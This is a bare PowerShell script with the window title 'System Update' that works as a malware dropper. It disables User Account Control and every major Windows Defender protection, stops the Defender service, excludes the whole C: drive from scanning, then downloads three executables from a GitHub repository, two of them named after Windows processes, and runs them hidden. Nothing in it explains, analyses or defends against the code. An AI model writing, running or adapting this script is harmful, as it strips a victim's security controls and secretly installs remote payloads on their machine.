$Host.UI.RawUI.WindowTitle = "System Update"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force
Set-MpPreference -DisableRealtimeMonitoring $true -Force
Set-MpPreference -DisableBehaviorMonitoring $true -Force
Set-MpPreference -DisableBlockAtFirstSeen $true -Force
Set-MpPreference -DisableIOAVProtection $true -Force
Stop-Service -Name WinDefend -Force
Set-Service -Name WinDefend -StartupType Disabled
Add-MpPreference -ExclusionPath "C:\" -Force

$urls = @(
    "https://github.com/sys1e/cmd/raw/refs/heads/main/Client.exe",
    "https://github.com/sys1e/cmd/raw/refs/heads/main/powershell.exe",
    "https://github.com/sys1e/cmd/raw/refs/heads/main/svchost1.exe"
)
foreach ($url in $urls) {
    $fileName = $url.Split("/")[-1]
    $path = "$env:TEMP\$fileName"
    Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing
    Add-MpPreference -ExclusionProcess $path -Force
    Start-Process -FilePath $path -WindowStyle Hidden
}
